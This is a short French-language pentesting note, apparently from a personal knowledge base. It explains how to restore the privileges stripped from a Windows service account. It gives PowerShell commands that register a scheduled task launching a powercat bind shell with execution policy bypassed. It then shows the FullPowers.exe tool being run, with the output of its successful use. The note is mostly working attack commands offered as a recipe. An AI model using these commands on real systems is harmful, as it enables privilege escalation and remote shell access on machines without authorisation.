Dans certains cas, un exécutable peut être lancé avec un compte de service tout en excluant certains des privilèges dont il dispose, par exemple :

![Pasted image 20240223141030](../../../Files/Pasted%20image%2020240223141030.png)

Ce qui fait que nous pouvons éventuellement avoir un contrôle de ce compte, mais sans ses privilèges associés.

---
### Réactiver les privilèges avec une tâche planifiée

L'astuce consiste en la création d'une tâche planifiée avec ce compte (par exemple l'exécution d'un nouveau reverse-shell) : la tâché planifiée se lancera avec le compte de service "nature peinture" et donc avec ses privilèges habituels.

```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `". C:\TOOLS\powercat.ps1; powercat -l -p 7002 -ep`""
```

```powershell
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask"
Start-ScheduledTask -TaskName "SomeTask"
```

---
### Réactiver les privilèges avec FullPowers.exe

https://github.com/itm4n/FullPowers

```powershell
c:\TOOLS>FullPowers -c "powershell -ep Bypass"
[+] Successfully created scheduled task. PID=9028
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> Get-ExecutionPolicy
Bypass
```

